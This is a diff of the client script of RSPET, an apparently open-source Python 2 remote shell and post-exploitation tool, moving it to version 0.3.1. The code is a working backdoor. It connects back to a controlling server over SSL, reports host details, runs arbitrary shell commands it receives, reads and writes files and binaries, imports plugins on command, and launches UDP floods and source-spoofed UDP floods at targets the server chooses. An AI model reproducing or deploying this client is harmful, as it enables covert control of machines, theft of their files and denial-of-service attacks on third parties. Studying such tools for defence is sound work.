@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-# -*- coding: <UTF-8> -*-
+# -*- coding: UTF-8 -*-
 """rspet_client.py: RSPET's Client-side script."""
 from __future__ import print_function
 from sys import exit as sysexit, argv
@@ -8,13 +8,14 @@ from subprocess import Popen, PIPE
 from multiprocessing import Process, freeze_support
 from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
 from socket import error as sock_error
-from pinject import UDP, IP
+from socket import SHUT_RDWR
+import ssl
 
 __author__ = "Kolokotronis Panagiotis"
 __copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
 __credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
 __license__ = "MIT"
-__version__ = "0.2.7"
+__version__ = "0.3.1"
 __maintainer__ = "Kolokotronis Panagiotis"
 
 
@@ -24,6 +25,7 @@ def exponential_backoff(c_factor):
 
 
 def sys_info():
+    """Get platform info."""
     import platform
     sys_info_tup = platform.uname()
     return (sys_info_tup[0], sys_info_tup[1])
@@ -43,48 +45,6 @@ def get_len(in_string, max_len):
     return len_to_return
 
 
-def obf_deobf(byte_array):
-    """Obfuscate/Deobfuscate message."""
-    for i, val in enumerate(byte_array):
-        byte_array[i] = val ^ 0x41
-    return byte_array
-
-
-def make_en_stdout(stdout):
-    """Obfuscate (xor) and return string.
-
-    Keyword argument(s):
-    stdout -- string to be sent
-    """
-    en_stdout = bytearray(stdout, 'UTF-8')
-    return obf_deobf(en_stdout)
-    #for i in range(len(en_stdout)):
-    #    en_stdout[i] = en_stdout[i] ^ 0x41
-    #return en_stdout
-
-
-def make_en_bin_stdout(stdout):
-    """Obfuscate (xor) and return binary.
-
-    Keyword argument(s):
-    stdout -- binary to be sent
-    """
-    en_stdout = bytearray(stdout)
-    return obf_deobf(en_stdout)
-    #for i in range(len(en_stdout)):
-    #    en_stdout[i] = en_stdout[i] ^ 0x41
-    #return en_stdout
-
-
-def make_en_data(data):
-    """Deobfuscate (xor) data, return string."""
-    en_data = bytearray(data)
-    return obf_deobf(en_data)
-    #for i in range(len(en_data)):
-    #    en_data[i] = en_data[i] ^ 0x41
-    #return en_data
-
-
 def udp_flood_start(target_ip, target_port, msg):
     """Create UDP packet and send it to target_ip, target_port."""
     flood_sock = socket(AF_INET, SOCK_DGRAM)
@@ -102,6 +62,7 @@ def udp_spoof_pck(dest_ip, dest_port, source_ip, source_port, payload):
     source_ip -- the desired source ip
     source_port -- the desired source port
     """
+    from pinject import UDP, IP
     udp_header = UDP(source_port, dest_port, payload).pack(source_ip, dest_ip)
     ip_header = IP(source_ip, dest_ip, udp_header, IPPROTO_UDP).pack()
     return ip_header+udp_header+payload
@@ -128,10 +89,16 @@ class Client(object):
     """Class for Client."""
     def __init__(self, addr, port=9000):
         self.sock = socket(AF_INET, SOCK_STREAM)
+        try:
+            cntx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+        except AttributeError: # All PROTOCOL consts are merged on TLS in Python2.7.13
+            cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
+        self.sock = cntx.wrap_socket(self.sock)
         self.address = addr
-        self.port = port
+        self.port = int(port)
         self.quit_signal = False
         self.version = ("%s-%s" %(__version__, "full"))
+        self.plugins = {}
         self.comm_dict = {
             '00000' : 'killMe',
             '00001' : 'getFile',
@@ -141,7 +108,9 @@ class Client(object):
             '00005' : 'udpFlood',
             '00006' : 'udpSpoof',
             '00007' : 'command',
-            '00008' : 'KILL'
+            '00008' : 'KILL',
+            '00009' : 'loadPlugin',
+            '00010' : 'unloadPlugin'
         }
         self.comm_swtch = {
             'killMe'    : self.kill_me,
@@ -151,18 +120,23 @@ class Client(object):
             'sendBinary': self.send_binary,
             'udpFlood'  : self.udp_flood,
             'udpSpoof'  : self.udp_spoof,
-            'command'   : self.run_cm
+            'command'   : self.run_cm,
+            'loadPlugin': self.load_plugin,
+            'unloadPlugin': self.unload_plugin
         }
 
     def loop(self):
         """Client's main body. Accept and execute commands."""
         while not self.quit_signal:
-            en_data = self.get_en_data(5)
+            en_data = self.receive(5)
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
+                if en_data == '':
+                    self.reconnect()
                 continue
             self.comm_swtch[en_data]()
+        self.sock.shutdown(SHUT_RDWR)
         self.sock.close()
 
     def connect(self):
@@ -170,30 +144,24 @@ class Client(object):
         try:
             self.sock.connect((self.address, self.port))
             ###Send Version###
-            msg_len = get_len(self.version,2) # len is 2-digit (i.e. up to 99 chars)
-            en_stdout = make_en_stdout(msg_len)
-            en_stdout = self.send(en_stdout)
-            en_stdout = make_en_stdout(self.version)
-            en_stdout = self.send(en_stdout)
+            msg_len = get_len(self.version, 2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = self.send(msg_len)
+            en_stdout = self.send(self.version)
             ##################
             sys_type, sys_hname = sys_info()
             ###Send System Type###
-            msg_len = get_len(sys_type,2) # len is 2-digit (i.e. up to 99 chars)
-            en_stdout = make_en_stdout(msg_len)
-            en_stdout = self.send(en_stdout)
-            en_stdout = make_en_stdout(sys_type)
-            en_stdout = self.send(en_stdout)
+            msg_len = get_len(sys_type, 2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = self.send(msg_len)
+            en_stdout = self.send(sys_type)
             ######################
             ###Send Hostname###
             if sys_hname == "":
                 sys_hname = "None"
-            msg_len = get_len(sys_hname,2) # len is 2-digit (i.e. up to 99 chars)
-            en_stdout = make_en_stdout(msg_len)
-            en_stdout = self.send(en_stdout)
-            en_stdout = make_en_stdout(sys_hname)
-            en_stdout = self.send(en_stdout)
+            msg_len = get_len(sys_hname, 2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = self.send(msg_len)
+            en_stdout = self.send(sys_hname)
             ###################
-        except sock_error:
+        except sock_error, ValueError:
             raise sock_error
         return 0
 
@@ -206,13 +174,13 @@ class Client(object):
             try:
                 self.connect()
             except sock_error:
-                exponential_backoff(c_factor)
+                sleep(exponential_backoff(c_factor))
                 c_factor += 1
             else:
                 connected = True
 
     def send(self, data):
-        """Send message to Server."""
+        """Send data to Server."""
         r_code = 0
         try:
             self.sock.send(data)
@@ -221,15 +189,13 @@ class Client(object):
             self.reconnect()
         return r_code
 
-    def get_en_data(self, size):
-        """Get data, return string."""
+    def receive(self, size):
+        """Receive data from Server."""
         data = self.sock.recv(size)
-        return make_en_data(data).decode('UTF-8')
-
-    def get_en_bin_data(self, size):
-        """Get data, return binary."""
-        data = self.sock.recv(size)
-        return make_en_data(data)
+        if data == '':
+            self.reconnect()
+            raise sock_error
+        return data
 
     def kill_me(self):
         """Close socket, terminate script's execution."""
@@ -237,9 +203,9 @@ class Client(object):
 
     def run_cm(self):
         """Get command to run from server, execute it and send results back."""
-        en_data = self.get_en_data(13)
-        en_data = self.get_en_data(int(en_data))
-        comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+        command_size = self.receive(13)
+        command = self.receive(int(command_size))
+        comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         stdout, stderr = comm.communicate()
         if stderr:
             decode = stderr.decode('UTF-8')
@@ -248,37 +214,32 @@ class Client(object):
         else:
             decode = 'Command has no output'
         len_decode = get_len(decode, 13)
-        en_stdout = make_en_stdout(len_decode)
-        en_stdout = self.send(en_stdout)
+        en_stdout = self.send(len_decode)
         if en_stdout == 0:
-            en_stdout = make_en_stdout(decode)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(decode)
         return 0
 
     def get_file(self):
         """Get file name and contents from server, create file."""
         exit_code = 0
-        en_data = self.get_en_data(3) #Filename length up to 999 chars
-        en_data = self.get_en_data(int(en_data))
+        fname_length = self.receive(3) # Filename length up to 999 chars
+        fname = self.receive(int(fname_length))
         try:
-            file_to_write = open(en_data, 'w')
+            file_to_write = open(fname, 'w')
             stdout = 'fcs'
         except IOError:
             stdout = 'fna'
             exit_code = 1
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
         else:
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
             if en_stdout == 0:
-                f_size = self.get_en_data(13) #File size up to 9999999999999 chars
-                en_data = self.get_en_data(int(f_size))
+                f_size = self.receive(13) # File size up to 9999999999999 chars
+                en_data = self.receive(int(f_size))
                 file_to_write.write(en_data)
                 file_to_write.close()
                 stdout = "fsw"
-                en_stdout = make_en_stdout(stdout)
-                en_stdout = self.send(en_stdout)
+                en_stdout = self.send(stdout)
             else:
                 file_to_write.close()
         return exit_code
@@ -286,27 +247,24 @@ class Client(object):
     def get_binary(self):
         """Get binary name and contents from server, create binary."""
         exit_code = 0
-        en_data = self.get_en_data(3) #Filename length up to 999 chars
-        en_data = self.get_en_data(int(en_data))
+        bname_length = self.receive(3) # Filename length up to 999 chars
+        bname = self.receive(int(bname_length))
         try:
-            bin_to_write = open(en_data, 'wb')
+            bin_to_write = open(bname, 'wb')
             stdout = 'fcs'
         except IOError:
             stdout = 'fna'
             exit_code = 1
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
         else:
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
             if en_stdout == 0:
-                b_size = self.get_en_data(13) #Binary size up to 9999999999999 symbols
-                en_data = self.get_en_bin_data(int(b_size))
+                b_size = self.receive(13) # Binary size up to 9999999999999 symbols
+                en_data = self.receive(int(b_size))
                 bin_to_write.write(en_data)
                 bin_to_write.close()
                 stdout = "fsw"
-                en_stdout = make_en_stdout(stdout)
-                en_stdout = self.send(en_stdout)
+                en_stdout = self.send(stdout)
             else:
                 bin_to_write.close()
         return exit_code
@@ -314,29 +272,25 @@ class Client(object):
     def send_file(self):
         """Get file name from server, send contents back."""
         exit_code = 0
-        en_data = self.get_en_data(3) #Filename length up to 999 chars
-        en_data = self.get_en_data(int(en_data))
+        fname_length = self.receive(3) # Filename length up to 999 chars
+        fname = self.receive(int(fname_length))
         try:
-            file_to_send = open(en_data, 'r')
+            file_to_send = open(fname, 'r')
             stdout = 'fos'
         except IOError:
             stdout = 'fna'
             exit_code = 1
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
         else:
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
             if en_stdout == 0:
                 file_cont = file_to_send.read()
                 file_to_send.close()
                 stdout = get_len(file_cont, 13)
-                en_stdout = make_en_stdout(stdout)
-                en_stdout = self.send(en_stdout)
+                en_stdout = self.send(stdout)
                 if en_stdout == 0:
                     stdout = file_cont
-                    en_stdout = make_en_stdout(stdout)
-                    en_stdout = self.send(en_stdout)
+                    en_stdout = self.send(stdout)
             else:
                 file_to_send.close()
         return exit_code
@@ -344,37 +298,33 @@ class Client(object):
     def send_binary(self):
         """Get binary name from server, send contents back."""
         exit_code = 0
-        en_data = self.get_en_data(3) #Filename length up to 999 chars
-        en_data = self.get_en_data(int(en_data))
+        bname_length = self.receive(3) # Filename length up to 999 chars
+        bname = self.receive(int(bname_length))
         try:
-            bin_to_send = open(en_data, 'rb')
+            bin_to_send = open(bname, 'rb')
             stdout = 'fos'
         except IOError:
             stdout = 'fna'
             exit_code = 1
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
         else:
-            en_stdout = make_en_stdout(stdout)
-            en_stdout = self.send(en_stdout)
+            en_stdout = self.send(stdout)
             if en_stdout == 0:
                 bin_cont = bin_to_send.read()
                 bin_to_send.close()
                 stdout = get_len(bin_cont, 13)
-                en_stdout = make_en_stdout(stdout)
-                en_stdout = self.send(en_stdout)
+                en_stdout = self.send(stdout)
                 if en_stdout == 0:
                     stdout = bin_cont
-                    en_stdout = make_en_bin_stdout(stdout)
-                    en_stdout = self.send(en_stdout)
+                    en_stdout = self.send(stdout)
             else:
                 bin_to_send.close()
         return exit_code
 
     def udp_flood(self):
         """Get target ip and port from server, start UPD flood wait for 'KILL'."""
-        en_data = self.get_en_data(3) # Max ip+port+payload length 999 chars
-        en_data = self.get_en_data(int(en_data))
+        en_data = self.receive(3) # Max ip+port+payload length 999 chars
+        en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
         target_ip = en_data[0]
         target_port = int(en_data[1])
@@ -383,7 +333,7 @@ class Client(object):
         proc.start()
         killed = False
         while not killed:
-            en_data = self.get_en_data(5)
+            en_data = self.receive(5)
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
@@ -395,8 +345,8 @@ class Client(object):
 
     def udp_spoof(self):
         """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
-        en_data = self.get_en_data(3)
-        en_data = self.get_en_data(int(en_data))
+        en_data = self.receive(3) # Max ip+port+spoofedip+spoofed port+payload length 999 chars
+        en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
         target_ip = en_data[0]
         target_port = int(en_data[1])
@@ -409,7 +359,7 @@ class Client(object):
         proc.start()
         killed = False
         while not killed:
-            en_data = self.get_en_data(5)
+            en_data = self.receive(5)
             try:
                 en_data = self.comm_dict[en_data]
             except KeyError:
@@ -419,19 +369,79 @@ class Client(object):
                 killed = True
         return 0
 
+    def load_plugin(self):
+        """Asyncronously load a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            self.plugins[en_data] = __import__(en_data)
+            self.send("psl")
+        except ImportError:
+            self.send("pnl")
+
+    def unload_plugin(self):
+        """Asyncronously unload a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            del self.loaded_plugins[en_data]
+        except ImportError:
+            pass
+
+
+class PluginMount(type):
+    def __init__(cls, name, base, attr):
+        """Called when a Plugin derived class is imported
+
+        Gathers all methods needed from __cmd_states__ to __server_cmds__"""
+
+        tmp = cls()
+        for fn in cls.__client_cmds__:
+            # Load the function (if its from the current plugin) and see if
+            # it's marked. All plugins' commands are saved as function names
+            # without saving from which plugin they come, so we have to mark
+            # them and try to load them
+
+            if cls.__client_cmds__ is not None:
+                continue
+
+            try:
+                f = getattr(tmp, fn)
+                if f.__is_command__:
+                    cls.__server_cmds__[fn] = f
+            except AttributeError:
+                pass
+
+class Plugin(object):
+    """Plugin class (to be extended by plugins)"""
+    __metaclass__ = PluginMount
+
+    __client_cmds__ = {}
+
+
+# Plugin decorator
+def command(fn):
+    Plugin.__client_cmds__[fn.__name__] = None
+
+    return fn
+
 
 def main():
     """Main function. Handle object instances."""
     try:
         rhost = argv[1]
     except IndexError:
-        print ("Must provide hotst")
         sysexit()
     try:
         myself = Client(rhost, argv[2])
     except IndexError:
         myself = Client(rhost)
-    myself.connect()
+    try:
+        myself.connect()
+    except sock_error:
+        myself.reconnect()
     myself.loop()
 
 
